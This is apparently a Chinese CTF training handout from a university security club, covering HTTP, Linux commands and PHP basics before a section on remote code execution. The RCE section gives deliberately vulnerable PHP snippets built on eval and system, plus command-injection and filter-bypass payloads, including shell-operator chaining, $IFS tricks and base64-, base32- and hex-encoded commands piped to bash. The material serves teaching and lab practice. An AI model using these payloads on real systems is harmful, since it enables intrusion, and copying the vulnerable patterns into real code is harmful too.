# HTTP
## 什么是HTTP协议？
**HTTP (HyperText Transfer Protocol)**，即超文本传输协议，是互联网上应用最为广泛的一种网络协议。它定义了浏览器（客户端）与服务器之间如何交换数据。HTTP 工作在 TCP/IP 模型之上，通常使用端口 80。  

**什么是超文本？**

```java
<a href="https://www.hnusec.com">HnuSec</a>
```

欢迎访问[HnuSec](https://www.hnusec.com/)

按**TCP/IP 四层模型** 进行分类 ：

| 层级 | 核心协议 | 关键功能 |
| --- | --- | --- |
| 应用层 | HTTP, DNS, FTP, SMTP, SSH | 提供用户服务 |
| 传输层 | TCP, UDP | 端到端可靠/快速传输 |
| 网络层 | IP, ICMP, ARP | 跨网络寻址与路由 |
| 链路层 | Ethernet, Wi-Fi, PPP | 本地网络帧传输 |


## HTTP 的工作机制  
### HTTP 请求和响应
HTTP 的基本工作原理是客户端（通常是 web 浏览器）向服务器发送请求，服务器接收到请求后，返回相应的资源。这些资源可以是网页、图像、音频文件、视频等。  

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/54428404/1769059606588-2ecc33e2-3bc9-464b-89c9-8ba9373d0803.png)

+ 建立连接。
+ 客户端发送 HTTP 请求。
+ 服务器处理并返回 HTTP 响应。
+ 关闭连接（或保持连接以备后用）。

**无状态保存**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/54428404/1769185645641-09b4f251-fed2-4546-80bc-61f78639bb9d.png)

### URL
**URL** 的全称是 **Uniform Resource Locator**，中文译为 **统一资源定位符**。  

**URL 是 HTTP 请求的目标**： HTTP 协议必须依靠 URL 才能知道要连接哪台服务器（域名/IP），以及请求该服务器上的哪个资源（路径）。  

一个典型的 URL 由以下几个部分组成，每个部分都有其特定的功能：

`**https://www.example.com:443/path/to/file.php?id=1#section**`

| 组成部分 | 一句话说明 | 示例（基于示例 URL） |
| --- | --- | --- |
| **协议** | 规定浏览器与服务器通信的“语言”和方式。 | `https://` |
| **主机名/域名** | 指向互联网上存放资源的某台具体服务器的地址。 | `www.example.com` |
| **端口** | 服务的“入口”。HTTPS 默认为 443，HTTP 默认为 80。 | `:443` |
| **路径** | 资源在服务器上的存储位置，类似于电脑文件的目录。 | `/path/to/file.php` |
| **查询参数** | 传递给服务器的额外数据，以 `?`开始，`&`分隔键值对。 | `?id=1` |
| **锚点** | 指向页面内的特定位置（如某个标题），数据不发送给服务器。 | `#section` |


 当你访问 `http://www.example.com/index.php?id=1` 时，HTTP 协议会将 URL 拆解并填入报文中  

#### URL编码
URL编码（也称为百分比编码）是一种将数据转换为可以安全包含在URL中的格式的编码方式。它用于

处理可能在URL中无效或有特殊含义的字符，例如空格、非ASCII字符和特殊符号。

**1. 安全字符（无需编码）**

以下字符可以直接在 URL 中使用：

+ **字母**：`A-Z`, `a-z`。
+ **数字**：`0-9`。
+ **特定符号**：连字符 `-`、下划线 `_`、点 `.`、波浪号 `~`。

**2. 需要编码的字符**

+ **空格**：编码为 `%20` 或 `+`。
+ **非安全字符**：具有特殊语法的符号，如 `!`, `@`, `#`, `$`, `%`, `^`, `&`, `*`, `()`, `{}`, `[]`, `|`, `\` 等。
+ **非 ASCII 字符**：所有非 ASCII 字符都会编码为 `%` 后跟 UTF-8 编码的十六进制值。

### HTTP 请求与响应的结构
**1. HTTP 请求的结构**

一个请求由四部分组成：

+ **请求行 (Request Line)**：包含请求方法（如 GET）、URL 和协议版本。
+ **请求头 (Request Headers)**：描述客户端环境、身份验证等信息（如 `User-Agent`, `Host`）。
+ **空行**：必不可少，用于区分头部和主体。
+ **请求体 (Request Body)**：发送给服务器的数据（仅在 POST/PUT 等方法中使用）。

```java
GET /index.html HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Connection: keep-alive
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/54428404/1769185823444-f41acd04-b690-41b4-abf2-1695c1b500fa.png)

**2. HTTP 响应的结构**

一个响应由四部分组成：

+ **状态行 (Status Line)**：包含协议版本、状态码（如 200）和状态描述。
+ **响应头 (Response Headers)**：描述服务器信息、数据类型等（如 `Content-Type`, `Server`）。
+ **空行**。
+ **响应体 (Response Body)**：服务器返回的实际数据（如 HTML、图片、JSON）。

```java
HTTP/1.1 200 OK
Date: Wed, 18 Apr 2024 12:00:00 GMT
Server: Apache/2.4.1 (Unix)
Last-Modified: Wed, 18 Apr 2024 11:00:00 GMT
Content-Length: 12345
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<head>
    <title>Example Page</title>
</head>
<body>
    <h1>Hello, World!</h1>
    <!-- The rest of the HTML content -->
</body>
</html>
```

### HTTP 请求详解
** 1. 常见的 HTTP 请求方法  **

| **<font style="color:black;">方法</font>** | **<font style="color:black;">作用</font>** | **<font style="color:black;">安全角度说明</font>** | <font style="color:black;"></font> |
| --- | --- | --- | --- |
| <font style="color:black;">GET</font> | <font style="color:black;">获取资源</font> | <font style="color:black;">常用于查询、搜索、分页  </font> | <font style="color:black;"></font> |
| <font style="color:black;">POST</font> | <font style="color:black;">提交数据</font> | <font style="color:black;">常用于登录、表单</font> | <font style="color:black;"></font> |
| <font style="color:black;">PUT</font> | <font style="color:black;">更新资源</font> | <font style="color:black;">REST 风格 API</font> | <font style="color:black;"></font> |
| <font style="color:black;">DELETE</font> | <font style="color:black;">删除资源</font> | <font style="color:black;">高危操作</font> | <font style="color:black;"></font> |
| <font style="color:black;">HEAD</font> | <font style="color:black;">获取响应头</font> | <font style="color:black;">信息收集</font> | <font style="color:black;"></font> |
| <font style="color:black;">OPTIONS</font> | <font style="color:black;">查询支持方法</font> | <font style="color:black;">常用于 CORS</font> | <font style="color:black;"></font> |


**GET方法：**

****数据附加在 URL 之后，以问号 `?` 开始，参数之间用 `&` 分隔。  

```php
GET /search.php?keyword=php&page=1 HTTP/1.1
Host: example.com
```

**POST方法：**

数据放在请求体中，不会显示在 URL 里。  

```php
POST /login.php HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

username=admin&password=123456
```

**2.常见的请求头**

** **1. 基础信息类  

+ **Host**: 指定请求的服务器域名和端口号。
+ **User-Agent**: 告诉服务器客户端的浏览器类型、操作系统及版本信息。
+ **Referer**: 标识当前请求是从哪个页面链接过来的（来源页面）。
+ **Connection**: 决定当前的底层 TCP 连接在请求完成后是否保持打开（如 `keep-alive`）。

 2. 内容协商类  

+ **Accept**: 告诉服务器客户端能够处理的媒体类型（MIME 类型），如 `text/html`。
+ **Accept-Encoding**: 告知服务器客户端支持的内容压缩算法，如 `gzip` 或 `br`。
+ **Accept-Language**: 告知服务器客户端期望的语言环境，用于实现多语言页面。
+ **Content-Type**: 在 POST 请求中，描述请求体的数据格式（如 `application/x-www-form-urlencoded` 或 `multipart/form-data`）。

```plain
常见的媒体格式类型如下：
● text/html ： HTML格式
● text/plain ：纯文本格式
● text/xml ： XML格式
● image/gif ：gif图片格式
● image/jpeg ：jpg图片格式
● image/png：png图片格式
```

 3. 认证与状态类  

+ **Cookie**: 客户端存储并发送给服务器的键值对数据，常用于维持登录状态或追踪用户。
+ **Authorization**: 用于提供服务器验证身份所需的凭证（如 Basic 认证或 Bearer Token）。

 4. 安全与特殊类  

+ **X-Forwarded-For**: 记录请求经过的代理服务器 IP，常用于获取客户端的真实 IP 地址。
+ **Origin**: 标识跨域请求（CORS）或 POST 请求的来源，不包含路径信息，仅含协议、域名和端口。

### HTTP 响应详解
**1. 常见的 HTTP 响应头**

| <font style="color:black;">响应头</font> | <font style="color:black;">核心作用</font> |
| --- | --- |
| <font style="color:black;">Content-Type</font> | <font style="color:black;">指定响应体类型</font> |
| <font style="color:black;">Content-Length</font> | <font style="color:black;">响应体长度</font> |
| <font style="color:black;">Set-Cookie</font> | <font style="color:black;">下发 Cookie</font> |
| <font style="color:black;">Location</font> | <font style="color:black;">重定向地址</font> |
| <font style="color:black;">Server</font> | <font style="color:black;">服务器信息</font> |
| <font style="color:black;">Cache-Control</font> | <font style="color:black;">缓存策略</font> |
| <font style="color:black;">Access-Control-Allow-Origin</font> | <font style="color:black;">允许跨域来源</font> |
| <font style="color:black;">X-Frame-Options</font> | <font style="color:black;">防点击劫持</font> |


**2. HTTP 状态码**

+ 1xx（信息性状态码）：表示接收的请求正在处理。
+ 2xx（成功状态码）：表示请求正常处理完毕。
+ 3xx（重定向状态码）：需要后续操作才能完成这一请求。
+ 4xx（客户端错误状态码）：表示请求包含语法错误或无法完成。
+ 5xx（服务器错误状态码）：服务器在处理请求的过程中发生了错误。

## HTTP与HTTPS
**HTTPS（超文本传输安全协议，Hypertext Transfer Protocol Secure）**是 HTTP 的安全版本，它在 HTTP 下增加了 **SSL/TLS** 协议，提供了**数据加密、完整性校验和身份验证**。HTTPS 通常使用端口 443。  

>  SSL/TLS 协议通过在通信双方之间建立一条**加密隧道**，确保数据在传输过程中不被窃听、篡改或冒充。  
>

+ **身份验证 (Authentication)**：确认你访问的网站真的是它声称的那个（通过数字证书），防止“钓鱼网站”。
+ **数据加密 (Encryption)**：将明文数据转换为密文，即使黑客在网络中截获了数据，也无法解密看懂内容。
+ **数据完整性 (Integrity)**：防止数据在传输过程中被暗中修改。如果数据被动过，接收方会立即发现。

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/webp/54428404/1769080176533-2995bf0f-5f85-4dcd-a5e1-5bdd797183a3.webp)

## 题目演示
HTTP签到题

[[SWPUCTF 2023 秋季新生赛]NSS_HTTP_CHEKER  ](https://www.nssctf.cn/problem/4506)

# Linux基础
## 简单了解
**Linux 是一个免费、开源的操作系统**，相比windows， 体积小，程序稳定，可以长时间的运行且不出现问题，因此常用于**服务器**、**云计算**、**嵌入式设备（如安卓手机）以及安全开发与渗透测试。**

严格来说，**Linux 只是内核（Kernel）**。我们日常所说的 “Linux 系统”（如 Ubuntu、CentOS、Debian）其实是 **“GNU/Linux 发行版”。**

**开源免费、一切皆文件**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/54428404/1769083245577-be3956a4-da40-496b-beda-f2472092ad5f.png)

**常见的 Linux 发行版**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/54428404/1769182920646-81bddf94-5ffc-4a9b-842e-caf1fb56dc38.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/jpeg/54428404/1769183112809-8812d90a-2d01-4797-a756-5a325d16a237.jpeg)

**Ubuntu** - 以其用户友好性、强大的社区支持和丰富的软件库而闻名。[https://ubuntu.com/](https://ubuntu.com/)

**Kali Linux** - 专门为渗透测试、安全审计和数字取证而设计。它预装了大量的安全工具，涵盖了信息安全领域的各种任务，因此也被称为“黑客操作系统”。[https://www.kali.org/](https://www.kali.org/)

**环境搭建**

+ VMware虚拟机
+ WSL：WSL（Windows Subsystem for Linux，Windows 下的 Linux 子系统）是 Microsoft 提供的一种功能，允许用户在不使用虚拟机或双系统的情况下，在 Windows 上运行原生的 Linux 环境。它使开发者可以直接在 Windows 中运行 Linux 命令行工具、脚本和程序，同时与 Windows 文件系统无缝集成。
+ 服务器平台

**Linux 文件系统结构 ** 

Linux 不像 Windows 分为 C 盘、D 盘，它是一个**倒树状结构**。  

根目录`/`： 它是整个文件系统的顶层目录，所有其他目录都挂载在这个目录下。  
目录（`Directory`）： 类似于 `Windows` 的文件夹，用于组织和存储文件。  
文件（`File`）： 存储实际数据的地方，可以是文本文件、程序文件、图像文件等等。  
路径（`Path`）： 用于定位文件或目录的字符串，例如 `/home/user/documents/file.txt`。

+ 绝对路径： 从根目录 `/` 开始的完整路径，例如 `/etc/passwd`。
+ 相对路径： 相对于当前目录的路径，例如 `documents/file.txt`（如果当前目录是 `/home/user`）
+ <!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/jpeg/54428404/1769083929927-67932333-0ad5-4f00-ba4b-a3d5db24a881.jpeg)
+ `**/**`** (根目录)**：所有目录的起点。
+ `**/bin**`** & **`**/usr/bin**`：存放常用命令（二进制文件）。
+ `**/etc**`：存放系统配置文件（相当于 Windows 的注册表）。
+ `**/home**`：普通用户的个人家目录。
+ `**/root**`：超级管理员 Root 的家目录。
+ `**/var**`：存放经常变动的文件，如系统日志（log）、缓存文件和网站数据。
+ `**/tmp**`：存放临时文件的地方，任何用户都能在此存取，系统重启通常会清空。
+ <!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/54428404/1769083962566-e7f4d15e-b554-43c3-9663-8cdaf342d638.png)

## 基础命令
在 Windows 或 macOS 中，图形界面是系统不可分割的一部分。但在 Linux 中：

+ **Linux 的灵魂是内核和命令行。**

```java
1. ls：列出目录内容
● ls：列出当前目录的文件和文件夹。
● ls -l：以详细列表形式显示。
● ls -a：显示所有文件，包括隐藏文件。

2. cd：切换目录
● cd 目录名：进入指定目录。
● cd ..：返回上一级目录。
● cd ~：回到用户的主目录。

3. pwd：显示当前所在目录

4. mkdir：创建目录
● mkdir 目录名：创建一个新的目录。

5. touch：创建空文件
● touch file.txt：创建一个名为 file.txt 的空文件。

6. cat：查看文件内容
● cat file.txt：输出文件内容。
● cat flag.txt：常用于查看 flag 内容。

7. echo：输出字符串或写入文件
● echo hello：输出 hello。
● echo hello > a.txt：写入到文件（覆盖）。
● echo hello >> a.txt：追加到文件末尾。

8. cp：复制文件或目录
● cp a.txt b.txt：复制文件。
● cp -r dir1 dir2：递归复制目录。

9. mv：移动或重命名
● mv a.txt b.txt：重命名或移动文件。

10. rm：删除文件或目录
● rm a.txt：删除文件。
● rm -r dir：删除目录及其内容。

11. chmod：修改权限
● chmod +x script.sh：给文件添加可执行权限。

12. ps：查看进程
● ps aux：查看所有进程。
● ps -ef | grep nginx：查找特定进程。

13. top / htop：查看系统运行状况
● top：实时显示进程状态。
● htop：更好用的 top（需安装）。

14. netstat / ss：查看网络连接
● netstat -anp：查看监听端口与进程（老旧系统）。
● ss -tunlp：查看网络服务（更现代、推荐）。

15. ifconfig / ip a：查看网络信息
● ifconfig：旧命令，显示 IP 信息。
● ip a：现代命令，等效于 ifconfig。

16. wget / curl：下载文件
● wget http://example.com/file
● curl http://example.com/file -o file

17. uname：查看系统信息
● uname -a：显示内核和架构等信息。

18. whoami：查看当前用户名

19. find：查找文件
● find / -name flag.txt：全盘搜索 flag 文件。

20. grep：搜索字符串
● grep root /etc/passwd：搜索包含 root 的行。

21. export：设置环境变量
● export PATH=$PATH:/new/path

22. which / whereis：查命令路径
● which python：查看可执行路径。
```

# PHP基础
## 简单了解
PHP（全称：Hypertext Preprocessor，超文本预处理器）是一种开源的通用脚本语言，主要用于Web开发。它可以嵌入到HTML中，允许开发人员快速生成动态网页内容。

在web开发领域有这么一句广为流传的梗，~~PHP~~~~是世界上最好的语言~~。php广泛应用于网站后端、App后端、微信公众号后端、游戏后端、客户端后端等。同时也有着语法简洁，环境配置简单等对新手友好的特点。所以，学习语言的安全从php入手是极佳的选择。

但在学习php安全之前，有**一定的php基础**是必需的。

学习CTF或者安全并没有要求你做开发工作，而是审计工作，你不需要完全学习一门语言，只需要**掌握一些基础的语法**就可以。

[https://hello-ctf.com/hc-web/php_basic/#_7](https://hello-ctf.com/hc-web/php_basic/#_7) 

[https://www.runoob.com/php/php-tutorial.html](https://www.runoob.com/php/php-tutorial.html) 

[https://github.com/natro92/HnuSec-Training-Website/blob/main/docs/file/PHP1.pdf](https://github.com/natro92/HnuSec-Training-Website/blob/main/docs/file/PHP1.pdf)

[https://github.com/natro92/HnuSec-Training-Website/blob/main/docs/file/PHP2.pdf](https://github.com/natro92/HnuSec-Training-Website/blob/main/docs/file/PHP2.pdf)

**环境搭建：**

建议用phpstudy一键式部署环境

IDE推荐phpstorm或者vscode

**PHP与C语言的不同之处：**

| **特性** | **C 语言** | **PHP** |
| --- | --- | --- |
| **执行方式** | 编译执行（生成二进制文件） | 解释执行（脚本由 PHP 解释器运行） |
| **变量声明** | 强类型（`int a;`），必须先定义 | **弱类型**（`$a = 1;`），随用随写， 会根据上下文自动转换类型，所有变量必须以 `$`开头   |
| **内存管理** | 手动管理 (`malloc`, `free`) | **自动垃圾回收** (GarbageCollection) |


**1.执行方式**

C 语言  编译型语言   PHP  解释型语言  

基础格式：

```java
<?php
    //执行的相关PHP代码
?>
```

**2.变量声明**

C 语言：强类型 + 静态类型** ，**必须声明类型

```java
int x;
float y;
```

PHP：弱类型 + 动态类型 ，无需声明类型，会根据上下文自动转换类型，所有变量必须以 `$`开头 ， 变量名区分大小写  

```java
$a = 10;
$a = "hello";  // ✅ 合法
$y = 3.14;
```

**3.内存管理**

C 语言：手动内存管理

```java
int *p = malloc(sizeof(int));
*p = 10;
free(p);
```

❗ 忘记 `free()` → 内存泄漏  
❗ 重复 `free()` → 程序崩溃  

 PHP：自动内存管理（垃圾回收）  

```java
$a = [1, 2, 3];
// 用完自动释放
```

 📌 PHP 程序员**不直接接触内存地址**，极大降低了开发难度，但也隐藏了安全风险（如反序列化漏洞）。  

**4.表单数据**

PHP 内置了处理 Web 请求的 超全局变量，这是 C 语言标准库没有的：  

**$_GET** —— 接受 GET 请求传递的参数。

**示例**：`example.com/index.php?book=HELLOCTF`，你可以使用 `$_GET['book']` 来获取相应的值。

**$_POST** —— 接受 POST 请求传递的参数。

**示例**：对 `example.com/index.php` 进行 POST 传参，参数名为 `book` 内容为 `HelloCTF`，你可以使用 `$_POST['book']` 来获取相应的值。

**$_REQUEST** —— 接受 GET 和 POST 以及 Cookie 请求传递的参数。

**示例**：

+ 如果你通过 URL 传递了一个参数 `example.com/index.php?key=value_from_get`，你可以通过 `$_REQUEST['key']` 获取这个值。
+ 如果你通过 POST 方法提交了一个表单，其中有一个名为 `key` 的字段且其值为 `value_from_post`，你也可以通过 `$_REQUEST['key']` 获取这个值。
+ 同时，如果你设置了一个名为 `key` 的 cookie，其值为 `value_from_cookie`，你还是可以使用 `$_REQUEST['key']` 来获取这个值。

**5.单引号与双引号**

+ 单引号：不会解析变量。字符串里的内容会原样输出。
+ 双引号：会解析其中的变量，并输出变量的值。

```plain
<?php
$string = "beautiful";
$time = "winter";
 
$str = 'This is a $string $time morning!';
$str2 = "This is a $string $time morning!";
echo $str. PHP_EOL;
echo $str2;
```

# RCE
RCE（Remote Code Execution，远程命令执行）是指攻击者能够在目标服务器上执行任意代码的一种高危安全漏洞，结合我们刚刚学过的linux基础指令，简单来说就是在对方电脑上拿到权限、执行这些指令。RCE可以分为远程代码执行和远程命令执行。

## PHP中的危险函数
### 代码执行函数
1. **eval() 函数**

eval — 把字符串作为PHP代码执行

```java
 eval(string $code): mixed
```

+ **代码解析**：`eval()` 会将 `$code` 字符串中的内容解析为 PHP 代码并执行。
+ **作用域继承**：执行的代码会继承 `eval()` 所在行的变量作用域。也就是说，在 `eval()` 中可以访问和修改 `eval()` 函数外部的变量。

**返回值:**

eval() 返回 `[null](https://www.php.net/manual/zh/reserved.constants.php#constant.null)`，除非在执行的代码中 `return` 了一个值，函数返回传递给 `return` 的值。  

```java
<?php
$a = 10;
$b = 20;
$ans = '$c = $a + $b;echo $c;';
eval($ans);
?>
```

2. **assert() 函数**

`assert()` 函数在 PHP 7.2 之前 ，它如果接收到字符串参数，会将其作为 PHP 代码执行，这使其成为了一个隐蔽的危险函数。PHP 8.0+：不再支持代码执行，仅支持表达式判断，大大提升了安全性。  

```java
assert ( mixed $assertion [, string $description ] ) : bool
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.nlark.com/yuque/0/2026/png/54428404/1769155029502-74eafc20-cb05-4a65-bb71-803e359f8f26.png)

### 命令执行函数
#### 有回显
1. **system()**

system — 执行外部程序，并且显示输出

```java
 system(string $command, int &$result_code = null): string|false
```

command：执行command参数所指定的命令，并且输出执行结果

如果提供return_code参数，则外部命令执行后的返回状态将会被设置到此变量中。

举例：

```java
<?php
system("ls -l");
?>
```

2. **passthru()**

passthru — 执行外部程序并且显示原始输出

```java
 passthru(string $command, int &$result_code = null): ?false
```

举例：

```java
<?php
passthru('ls /');
passthru('whoami');
```

3. **pcntl_exec()**

pcntl_exec — 在当前进程空间执行指定程序

主要用于处理Unix/Linux系统中的进程管理

```java
 pcntl_exec(string $path, array $args = [], array $env_vars = []): bool
```

`path` 必须时可执行二进制文件路径或一个在文件第一行指定了 一个可执行文件路径标头的脚本（比如文件第一行是 #!/usr/local/bin/perl 的 perl 脚本）。

`args` 是一个要传递给程序的参数的字符串数组。 

`env_vars` 是一个要传递给程序作为环境变量的字符串数组。这个数组是 key => value 格式的，key 代表要传递的环境变量的名称，value 代表该环境变量值。 

**核心特点：进程替换**

+ **覆盖当前进程**：它会用新程序替换当前的 PHP 进程。
+ **后续代码不执行**：如果执行成功，原 PHP 脚本中该行之后的代码将**永远不会被执行**。

举例：

```java
<?php
// 执行 ls 命令，列出当前目录的文件
pcntl_exec("/bin/ls", ["-l"]);  #ls -l

// 如果 pcntl_exec 执行成功，以下代码不会被执行
echo "bxbxbxbxbxbxbxbx"; 
?>
```

#### 无回显
1. **exec()**

```java
 exec(string $command, array &$output = null, int &$result_code = null): string|false
```

`command` 要执行的命令。 

`output` 如果提供了 `output` 参数， 那么会用命令执行的输出填充此数组， 每行输出填充数组中的一个元素。 

`result_code` 如果同时提供 `output` 和 `result_code` 参数，命令执行后的返回状态会被写入到此变量。 接收命令执行后的状态码（通常 `0` 表示成功，非 `0` 表示失败）

**函数特点：**

**静默执行**：它执行外部命令，但**不直接输出**任何内容到浏览器。  

返回命令输出结果的**最后一行**。 如果执行失败，则返回 `false`。  

举例：

```php
<?php
exec('ls', $output);
echo "done";
```

**如何回显结果？**

使用output参数+print_r/var_dump可以回显全部内容

> **var_dump()** 函数输出变量的详细信息，包括变量的类型与值。数组将递归展开值，通过缩进显示其结构。  
>

```php
<?php
exec('whoami', $output);
print_r($output);
```

```php
<?php
print_r(exec('whoami'));
```

2. **shell_exec() 与 反引号(` `)**

shell_exec — 通过 shell 执行命令并将完整的输出以字符串的方式返回

```php
 shell_exec(string $command): string|false|null
```

在 PHP 中，反引号 被称为**执行运算符**。它的功能与 `shell_exec()` 函数完全相同，用于在服务器底层系统中执行命令。

```php
<?php
$abc=`whoami`;
echo $abc;
```

3. **popen() 与 proc_open()**

popen — 打开进程文件指针

```php
popen ( string $command , string $mode ) : resource
```

+ `**$command**`：要执行的命令。
+ `**$mode**`：模式。`'r'` 表示只读（读取命令输出），`'w'` 表示只写（向命令写入数据）。

proc_open()：与popen()类似

举例：

```php
<?php
highlight_file(__FILE__);
$cmd = $_GET["cmd"];      // 接收用户传入的命令
$ben = popen($cmd, 'r');  // 以只读模式打开进程管道
while($s = fgets($ben)){  // 循环读取管道中的每一行输出
    print_r($s);          // 打印输出结果
}
?>
// 攻击测试：?cmd=whoami
```

## 常见的绕过
### L1--无过滤
一道最简单的题目，没有任何过滤

```plain
flag{...}
```

[RCE-labs]Level 1  

```php
<?php
highlight_file(__FILE__);
eval($_GET["J4t"]);
#?J4t=system("ls /");
?>
```

```php
<?php
highlight_file(__FILE__);
system($_POST["J4t"]);
#J4t=ls
?>
```

### L2--SHELL 运算符绕过
利用shell运算符实现命令拼接

```java
;（命令分隔符）: 无论前一个命令 cmd_1 是否成功，都会执行下一个命令 cmd_2

&（后台运行符）: 将命令 cmd_1 放到后台执行，Shell 立即执行 cmd_2，两个命令并行执行

&&（逻辑与运算符）:前一个成功再执行后一个 【注意url编码】

||（逻辑或运算符）: 前一个失败才执行后一个

|（管道符）：将前面的命令的输出作为后面命令的输入，把前面命令的结果当成后面命令的参数；前面的命令和后面的命令都会执行，但只显示后面的命令执行结果。

%0a 换行
```

[RCE-labs]Level 4  

```java
<?php
$cmd = "ping " . $_GET['ip'];
system($cmd);
?>

//?ip=8.8.8.8;ls
//?ip=127.0.0.1%26%26ls
//?ip=||ls
```

### L3--文件名过滤绕过
例如：flag被ban

```java
preg_match("/flag/", $cmd)
```

#### 1.通配符绕过
*（星号）: 匹配零个或多个字符。例子: fl*

?（问号）: 匹配单个字符。例子: fla?

[]（方括号）: 匹配方括号内的任意一个字符。例子: file[1-3].txt。

[^]（取反方括号）: 匹配不在方括号内的字符。例子: file[^a-c].txt。

{}（大括号）: 匹配大括号内的任意一个字符串。例子: file{1,2,3}.txt。

#### 2.单引号双引号绕过
单引号(')双引号("")反引号(``)绕过正则 如 f''lag或f'l'ag

#### 3.反斜杠绕过
反斜杠\绕过 如cat fl\ag.p\hp

#### 4.特殊变量
特殊变量：$1到$9、$@和$*** **如fl$*ag fl$9ag

或者在单词结尾处插入$x，这里的x可以是任意字母，例如可以写成如下形式：

c$@at /e$@tc/pas$@swd

cat$x /etc$x/passwd$x

ca$@t /etc$x/passwd$x

#### 5.内联拼接执行绕过
自定义字符串，再拼接起来

a=f;c=l;d=ag;cat /$a$c$d

#### 6.利用linux中的环境变量
使用环境变量里的字符执行变量。

?cmd=passthru('cat f${PATH:5:1}${PATH:8:1}${PATH:66:1}.${PATH:93:1}h${PATH:93:1}');

```java
echo $PATH  PATH默认系统环境变量
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

```java
echo ${PATH:5:1}
使用环境变量PATH里的第5个字符，（从0开始计数，'l'为第5个字符），显示1个字符；
l
也可以echo f${PATH:5:2}
lo
#echo f${PATH:5:1}${PATH:8:1}${PATH:66:1}.${PATH:93:1}h${PATH:93:1}
即flag.php
```

 [RCE-labs]Level 5  

### L4--空格过滤绕过
有时候会禁用空格

```java
preg_match("/ /", $cmd)
```

可以用以下方法绕过

```java
1.URL编码：%09 tab %0a 换行 %0d 回车符 %20 空格


2.$IFS$9，${IFS}，$IFS，${IFS%??}，$'\x20'
在 Bash、sh 等 Shell 环境中，IFS 定义了当 shell 解析字符串时用来分隔字段的字符。默认值是一个空格（space）、制表符（tab）和换行符（newline）。

                       
3.大括号{} 如{cat,flag.php}  该语法只在 bash 中生效。  

           
4.重定向字符<，<> 如cat<>flag.txt，或者cat<flag.txt

           
5.环境变量组合，如${PATH:0:1}，${HOME:0:1}


6.base64编码执行 echo bHM= | base64 -d | bash
```

 [RCE-labs]Level 7  

### L5--常见文件读取命令绕过
题目有时会禁用cat这种常见的文件读取命令，该怎么办呢？

tac：反向显示；

more：一页一页的显示档案内容；

less: 与more类似;

tail : 查看末尾几行；

nl : 显示的时候，顺便输出行号；

od : 以二进制的方式读取档案内容；

```java
?cmd=passthru("od -A d -c flag.php");
```

xxd : 读取二进制文件；

```java
?cmd=passthru("xxd flag.php");
```

sort : 主要用于排序文件；

```java
?cmd=passthru("sort flag.php");
?cmd=passthru("/usr/bin/s?rt flag.php");
```

uniq : 报告或删除文件中重复的行；

```java
?cmd=passthru("uniq flag.php");
```

file-f : 报错出具体内容；

```java
?cmd=passthru("file-f flag.php");
```

grep：在文本中查找指定的字符串；

```java
?cmd=passthru("grep fla fla*"); #从fla*文本文件中搜索包含"fla"字符串的行
?cmd=passthru("grep { fla*"); #搜索{
```

### L6--编码绕过
#### Base64编码绕过
> 什么是Base64编码？
>
> Base64编码是一种基于64个可打印字符来表示二进制数据的编码方式。它常用于在需要以文本形式传输或存储二进制数据的场景中，比如电子邮件、URL参数、网络传输等。
>
> Base64编码的特点 : Base64使用以下64个字符作为编码表：字母：A-Z、a-z（共52个字符） 数字：0-9（共10个字符） 两个符号：＋和／（共2个字符） 。填充符：=（用于填充不足3字节的数据）
>

```plain
echo "Y2F0IGZsYWcudHh0Cg==" | base64-d #解码读取命令
即cat flag.txt
echo "Y2F0IGZsYWcudHh0Cg==" | base64 -d | bash #执行命令
|把cat flag.php，放在bash里执行
```

base64解码后的命令通过管道符传递给bash

```plain
payload：
echo xxxx|base64 -d|bash
`echo xxxx|base64 -d`
$(echo xxxx|base64 -d)

?cmd=passthru('`echo "Y2F0IGZsYWcudHh0Cg=="|base64 -d`');
```

#### base32编码绕过
```plain
?cmd=system('echo "MNQXIIDGNRQWOLTQNBYA===="|base32 -d|/bin/bash');
即执行cat flag.php
```

#### HEX编码（十六进制编码/ASCII码）绕过
```plain
?cmd=passthru('echo "74616320666c61672e706870"|xxd -r -p|bash');
即执行cat flag.php
```

# 拓展学习
学有余力的同学，可以继续学习

+ 无参数RCE
+ 无字母数字命令执行（异或、取反、自增）
+ 无回显的命令执行&反弹shell
+ 常见的php语言漏洞

# 作业
**关于作业的格式**

富文本格式，你需要去学习一下[Markdown 基本语法 | Markdown 教程](https://markdown.com.cn/basic-syntax/)

以及Writeup的书写

**作业内容：**

1. 自行搭建一个Linux环境（VMware/WSL），记录搭建的过程
2. 学习Linux基础指令和PHP基础语法，提交学习笔记
3. 整理http协议笔记，完成 [[NewStarCTF 2023 公开赛道]Begin of HTTP](https://buuoj.cn/challenges#[NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93]Begin%20of%20HTTP) 要求写题目Writeup
4. RCE-labs Level 0-8 [NSSCTF](https://www.nssctf.cn/problem)
5. CTFHub-RCE-命令注入 [CTFHub](https://www.ctfhub.com/#/skilltree)
6. 常用工具的安装

```plain
Hackbar:浏览器插件，能够在页面上直接完成请求/响应内容编辑，完成各种包括但是不限于伪造的工作。  
Burp Suite / Yakit ：代理抓包软件，用于Web应用程序的渗透测试和攻击，也有爆破等功能
dirsearch：目录扫描神器
sqlmap：自动化SQL注入工具
蚁剑：webshell 管理工具
